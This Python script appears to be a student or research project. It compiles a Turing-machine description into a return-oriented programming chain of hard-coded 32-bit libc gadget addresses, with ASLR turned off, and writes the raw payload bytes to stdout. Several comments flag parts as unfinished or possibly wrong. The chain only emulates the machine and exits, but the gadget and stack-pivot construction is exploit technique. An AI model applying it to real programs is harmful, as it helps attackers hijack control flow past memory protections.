import sys

class ROP:
    #TODO: int 0x80: 10a82
    #TODO: add libc offset: 0xb7dec000
    #TODO: set /proc/sys/kernel/randomize_va_space to 0
    # head starts in ecx, move to edx
    #******FIX*******
    def __init__(self, count):
        self.count = count
        self.arr = bytearray()

    def xchg_w_eax(self, reg):
        if (reg == "ebp"):
            #sys.stdout.buffer.write((0x0002d455 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.count += 2
            self.arr += (0x0002d455 + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "ebx"):
            #sys.stdout.buffer.write((0x000f99df + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.count += 2
            self.arr += (0x000f99df + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "ecx"):
            #TRASHES ECX: xchg eax, ecx ; and al, 0x5b ; ret
            #sys.stdout.buffer.write((0x0002664e + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.count += 3
            self.arr += (0x0002664e + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "edi"):
            #sys.stdout.buffer.write((0x00020a3d + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.count += 2
            self.arr += (0x00020a3d + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "edx"):
            #sys.stdout.buffer.write((0x00041702 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.count += 2
            self.arr += (0x00041702 + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "esi"):
            #sys.stdout.buffer.write((0x0001b286 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.count += 2
            self.arr += (0x0001b286 + 0xb7dec000).to_bytes(4, byteorder='little')
        if (reg == "esp"):
            #sys.stdout.buffer.write((0x0001b269 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.count += 2
            self.arr += (0x0001b269 + 0xb7dec000).to_bytes(4, byteorder='little')

    def swp_regs(self, reg1, reg2):
        self.xchg_w_eax(reg1)
        self.xchg_w_eax(reg2)
        self.xchg_w_eax(reg1)
        self.count += 6

    def initialize_head_state(self):
        # initialize head
        self.swp_regs("edx", "ecx")
        self.count += 2
        
    def write_head(self, num):
        # head is edx, eax is the value, moving eax into edx
        self.pop_register("eax")
        #sys.stdout.buffer.write((ord(num)).to_bytes(4, byteorder='little'))
        self.arr += (ord(num)).to_bytes(4, byteorder='little')
        #sys.stdout.buffer.write((0x0007672a + 0xb7dec000).to_bytes(4, byteorder='little')) # mov dword ptr [edx], eax ; ret
        self.arr += (0x0007672a + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 3
    
    def read_head(self):
        # assumes edx is head, eax is value and will store what is in head
        # move at address of edx into eax
        #sys.stdout.buffer.write((0x0006a227 + 0xb7dec000).to_bytes(4, byteorder='little')) # mov eax, dword ptr [edx] ; ret
        self.arr += (0x0006a227 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 2

    def move_head_left(self):
        # move edx into eax, decrement eax, move it back
        #sys.stdout.buffer.write((0x00088f34 + 0xb7dec000).to_bytes(4, byteorder='little')) # 0x00088f34 : mov eax, edx; ret
        #sys.stdout.buffer.write((0x0007bc64 + 0xb7dec000).to_bytes(4, byteorder='little')) # 0x0007bc64 : dec eax; ret
        #sys.stdout.buffer.write((0x00121c7d + 0xb7dec000).to_bytes(4, byteorder='little')) # 0x00121c7d : mov edx, eax ; mov eax, edx ; ret
        self.arr += (0x00088f34 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x0007bc64 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x00121c7d + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 7

    def move_head_right(self):
        #NOTE: BALANCED WITH MOVE_HEAD_LEFT W RET -> CHECK!!!
        #sys.stdout.buffer.write((0x0002d654 + 0xb7dec000).to_bytes(4, byteorder='little')) # : inc edx ; ret
        #sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) # nops with rets
        #sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little'))
        #sys.stdout.buffer.write((0x000190f1 + 0xb7dec000).to_bytes(4, byteorder='little'))  #RET - THIS COULD BE WRONG!!!
        self.arr += (0x0002d654 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')
        self.arr += (0x000190f1 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 7

    def increment_reg(self, reg):
        if(reg == "eax"):
            #sys.stdout.buffer.write((0x000270ea + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x000270ea + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "ebp"):
            #sys.stdout.buffer.write((0x00035832 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x00035832 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if (reg == "ebx"):
            #sys.stdout.buffer.write((0x0002d216 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0002d216 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "edx"):
            #sys.stdout.buffer.write((0x0002d654 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0002d654 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "esi"):
            #sys.stdout.buffer.write((0x000651a6 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x000651a6 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "esp"):
            #sys.stdout.buffer.write((0x00020668 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x00020668 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "ecx"): # NOTE: will trash ebx
            self.xchg_w_eax("ebx")
            #sys.stdout.buffer.write((0x000d3f2b + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x000d3f2b : inc ecx ; add al, 0x89 ; ret
            self.arr += (0x000d3f2b + 0xb7dec000).to_bytes(4, byteorder='little')
            self.xchg_w_eax("ebx")
            self.count += 3

    def decrement_reg(self, reg):
        if(reg == "eax"):
            #sys.stdout.buffer.write((0x0007bc64 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0007bc64 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "ebp"):
            #sys.stdout.buffer.write((0x0004c892 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0004c892 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "ecx"):
            #sys.stdout.buffer.write((0x0001e6f2 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0001e6f2 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "edi"):
            #sys.stdout.buffer.write((0x000472d4 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x000472d4 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "esi"):
            #sys.stdout.buffer.write((0x0005118a + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0005118a + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "esp"):
            #sys.stdout.buffer.write((0x000ea6c7 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x000ea6c7 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2

    def eax_minus_ecx(self):
        # EAX = EAX - ECX
        #sys.stdout.buffer.write((0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little'))
        self.arr += (0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 2

    def eax_plus_ecx(self):
        # EAX = EAX + ECX
        #sys.stdout.buffer.write((0x00098a40 + 0xb7dec000).to_bytes(4, byteorder='little'))   
        self.arr += (0x00098a40 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 2

    def zero_out_reg(self, reg):
        if(reg == "eax"):
            #sys.stdout.buffer.write((0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little')) # xor eax, eax
            self.arr += (0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        else: 
            self.xchg_w_eax(reg)
            self.zero_out_reg("eax")
            self.xchg_w_eax(reg)
   
   #TODO: Delete later
    def move_flags_eax(self, reg):
         # register value must be 0
        # NOTE: probably don't need so ignore issues for time being
        # LAHF with RETF 0x0003b5d2 : lahf ; retf // 9fcb
        # TODO: CHECK IF RETF IS OK
        #sys.stdout.buffer.write((0x0003b5d2 + 0xb7dec000).to_bytes(4, byteorder='little')) # loads flags into EAX
        self.count += 2
    
    def negate_reg(self, reg): # use negate when we want to use carry flag in jump function
        # negates a value by finding 2's complement of its single operand
        # NEG AFFECTS FLAGS
        if(reg == "eax"):
            #sys.stdout.buffer.write((0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "edx"):
            #sys.stdout.buffer.write((0x0001b0ac + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0001b0ac + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2

    #TODO: DELETE THIS LATER
    def push_register(self, reg):
        if(reg == "eax"):
            sys.stdout.buffer.write((0x0002e745 + 0xb7dec000).to_bytes(4, byteorder='little'))
        if (reg == "ecx"):
            #0x0008ae23 : push ecx ; add al, 0x5b ; ret // TRASHES EAX
            sys.stdout.buffer.write((0x0008ae23 + 0xb7dec000).to_bytes(4, byteorder='little'))
        if(reg == "edi"):
            sys.stdout.buffer.write((0x000e5705 + 0xb7dec000).to_bytes(4, byteorder='little'))
        if(reg == "edx"):
            sys.stdout.buffer.write((0x00158848 + 0xb7dec000).to_bytes(4, byteorder='little'))
        if(reg == "esi"):
            sys.stdout.buffer.write((0x000603c5 + 0xb7dec000).to_bytes(4, byteorder='little'))
        if(reg == "esp"):
            sys.stdout.buffer.write((0x00137dd6 + 0xb7dec000).to_bytes(4, byteorder='little'))
        if(reg == "ebx"): # will trash eax; 0x000c78c1 : push ebx ; or al, 0x83 ; ret; OR's al
            sys.stdout.buffer.write((0x000c78c1 + 0xb7dec000).to_bytes(4, byteorder='little'))

    def pop_register(self, reg):
        if(reg == "eax"):
            #sys.stdout.buffer.write((0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "ebp"):
            #sys.stdout.buffer.write((0x0001a4cc + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0001a4cc + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "ebx"):
            #sys.stdout.buffer.write((0x0001a8b5 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0001a8b5 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "edi"):
            #sys.stdout.buffer.write((0x00019173 + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x00019173 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "edx"):
            #sys.stdout.buffer.write((0x0002effc + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0002effc + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "esi"):
            #sys.stdout.buffer.write((0x0001bf2c + 0xb7dec000).to_bytes(4, byteorder='little'))
            self.arr += (0x0001bf2c + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "esp"):
            #sys.stdout.buffer.write((0x001236b0 + 0xb7dec000).to_bytes(4, byteorder='little')) 
            self.arr += (0x001236b0 + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if (reg == "ecx"):
            self.xchg_w_eax("ecx")
            self.pop_register("eax")
            self.xchg_w_eax("ecx")

    def and_eax_register(self, reg):
        if(reg == "ecx"):
            #sys.stdout.buffer.write((0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')) # and eax, ecx ; ret
            self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')
            self.count += 2
        if(reg == "edx"):
           #sys.stdout.buffer.write((0x0002df2e + 0xb7dec000).to_bytes(4, byteorder='little')) # and eax, edx ; ret
           self.arr += (0x0002df2e + 0xb7dec000).to_bytes(4, byteorder='little')
           self.count += 2

    #TODO: delete later, uses a push
    def add_eax_to_edx(self):
        # 0x00121c91 : add edx, eax ; pop ebx ; pop esi ; mov eax, edx ; ret
        # 0x00099403 : add eax, edx ; ret // 01d0c3 NOTE: would have to swap
        #TODO: FIX THE PUSH
        # NOTE: Possible other way to do this
            # tempOutput = self.xchg_w_eax("edx")
            # tempOutput += (0x00099403 + 0xb7dec000).to_bytes(4, byteorder='little') # add eax, edx ; ret // 01d0c3 NOTE: would have to swap
        self.push_register("esi")
        #sys.stdout.buffer.write((0x0012e414 + 0xb7dec000).to_bytes(4, byteorder='little')) # push random instead of pushing ebx; push 0x1185f89
        #sys.stdout.buffer.write((0x00121c91 + 0xb7dec000).to_bytes(4, byteorder='little')) # add edx, eax

    def jump(self):
        #print("in jump")
        # copy eax into temp register (edi)
        # swap edx with edi
        # 0x00121c7d : mov edx, eax ; mov eax, edx ; ret
        # swap edx with edi
        self.swp_regs("edx", "edi")
        #sys.stdout.buffer.write((0x00121c7d + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x00121c7d : mov edx, eax ; mov eax, edx ; ret
        self.arr += (0x00121c7d + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 3
        self.swp_regs("edx", "edi")
        #sub eax, ecx ; ret
        #sys.stdout.buffer.write((0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little'))
        self.arr += (0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 2
        # neg eax ; ret
        #sys.stdout.buffer.write((0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little'))
        self.arr += (0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 2
        # add with carry (adc reg, reg) ; ret
        self.zero_out_reg("esi")
        #sys.stdout.buffer.write((0x0007773c + 0xb7dec000).to_bytes(4, byteorder='little'))
        self.arr += (0x0007773c + 0xb7dec000).to_bytes(4, byteorder='little')
        self.count += 2
        # xchg eax, esi ; ret
        self.xchg_w_eax("esi")
        # neg eax
        self.negate_reg("eax")
        #save edx (head) in esi, bc need to use edx for esp_delta
        self.swp_regs("esi", "edx")
        # now: esi has edx value, AKA head; edi has eax AKA input symbol

        #TODO: PUT ESP_DELTA INTO EDX
        # esp_delta = 74 -> change this
        self.pop_register("edx")
        #sys.stdout.buffer.write((64).to_bytes(4, byteorder='little'))
        self.arr += (64).to_bytes(4, byteorder='little')
        self.count += 1
        # and eax, esp_delta
        self.and_eax_register("edx") # and eax, edx (esp_delta)

        #increment counter before jump

        self.increment_reg("ecx")
        #print("*****COUNT: ", self.count)
        # eax has esp_delta, need to add esp, eax
        # 0x0007672a : mov dword ptr [edx], eax ; ret // 8902c3
        # put right mem address into edx?
            # SPECIFIC ESP DELTA ADD
            # 0x00064ef8 : add esp, 0x7c ; ret // 83c47cc3
            # sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) # noop
            # sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) # noop
            # sys.stdout.buffer.write((0x00064ef8 + 0xb7dec000).to_bytes(4, byteorder='little')) # add esp, 0x7c ; ret
        # keep count in a variable of number of instructions - NOTE: assumes that each instruction is 4 bytes
        # use some kind of register to store esp delta
        # move register (with esp delta) to the address in memory
        # swap eax with edx - put esp_delta into edx
        self.xchg_w_eax("edx")
        self.pop_register("eax")
        #might be overcompensating in esp_delta, should only start counting after line 281??
        #print("PRINT: ", 0x37800000 + self.count + 6)       #0x378000D4 but esp_delta is 0x378000B0
        #sys.stdout.buffer.write((0x37800000 + self.count + 12).to_bytes(4, byteorder='little'))
        self.arr += (0x37800000 + len(self.arr) + 16).to_bytes(4, byteorder='little')
        #sys.stdout.buffer.write((0x000f4834 + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x000f4834 : mov dword ptr [eax], edx ; ret 
        self.arr += (0x000f4834 + 0xb7dec000).to_bytes(4, byteorder='little')
        #sys.stdout.buffer.write((0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x00098ffc : add dword ptr [eax], esp ; ret
        self.arr += (0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little')
        self.pop_register("esp")
        self.count += 4

        '''
        self.push_register("esp")
        self.pop_register("edx")
        self.add_eax_to_edx()       #delete later, wrong, uses a push
        self.push_register("edx")
        self.pop_register("esp") '''

    def helper(self, scan, length):
        #print("in helper")
        self.read_head() # will store in eax 
        #NOTE: this only works if read_head() only overwrites the lower 8 bits of eax - think we need to fix this!!!!!
        #eax has input symbol 

        # zero out ecx for counter;
        self.zero_out_reg("ecx")

        #TODO: change code to compare eax (state/symbol) & ecx (counter)
        for i in range(0, length):
            self.jump()
            # restore registers: esi to edx, edi to eax
            self.xchg_w_eax("edi")
            self.swp_regs("esi", "edx")

            output = scan.readline()
            #print(output)
            outputArr = output.split(" ")
            self.write_head(outputArr[3])
            # check for accept/reject state. else, call helper again
            #print(outputArr[2])
            if (outputArr[2] == 'r'):
                #print("reject")
                self.pop_register("eax")
                #sys.stdout.buffer.write((0x00000001).to_bytes(4, byteorder='little'))      # pop 1 into eax for exit code
                self.arr += (0x00000001).to_bytes(4, byteorder='little')
                #sys.stdout.buffer.write((0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little'))        #int 0x80 in libc
                #self.arr += (0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little')
                self.arr += (0xb7eacc5a).to_bytes(4, byteorder='little')
                self.count += 2
            
            elif (outputArr[2] == 'a'):
                #print("accept")
                self.pop_register("eax")
                #sys.stdout.buffer.write((0x00000000).to_bytes(4, byteorder='little'))      # pop 0 into eax for exit code
                self.arr += (0x00000000).to_bytes(4, byteorder='little')
                #sys.stdout.buffer.write((0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little'))
                #self.arr += (0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little')
                self.arr += (0xb7eacc5a).to_bytes(4, byteorder='little')
                self.count += 2

            else:
                self.zero_out_reg("ecx")   
                self.pop_register("eax")
                #sys.stdout.buffer.write((ord(outputArr[2])).to_bytes(4, byteorder='little'))      #pop output state into eax
                self.arr += (ord(outputArr[2])).to_bytes(4, byteorder='little')
                #sys.stdout.buffer.write((0x0006ea87 + 0xb7dec000).to_bytes(4, byteorder='little'))        #or ch, al ; ret
                self.arr += (0x0006ea87 + 0xb7dec000).to_bytes(4, byteorder='little')
                self.count += 3
                #at this point, the new state is in ch, need to move to ah, al is 0
                self.xchg_w_eax("ecx")
                #check direction
                if(outputArr[4] == 'R'):
                    self.move_head_right()
                else:
                    self.move_head_left()
                #helperOutput = self.helper(helperOutput, scan, length)
                #return self.helper(helperOutput, scan, length)
        # return helperOutput

    def main(self, filename):
        #COUNTER: ECX
        self.initialize_head_state()
        self.zero_out_reg("eax")
        input_ = open(filename, 'r')
        inputLines = input_.readlines()
        length = len(inputLines)
        input_.close()
        scan = open(filename, 'r')
        self.helper(scan, length)
        #print(self.arr)
        sys.stdout.buffer.write(self.arr)
        #print("LENGTH: ",len(self.arr))
a = ROP(0)
a.main("testing.txt")


            
            

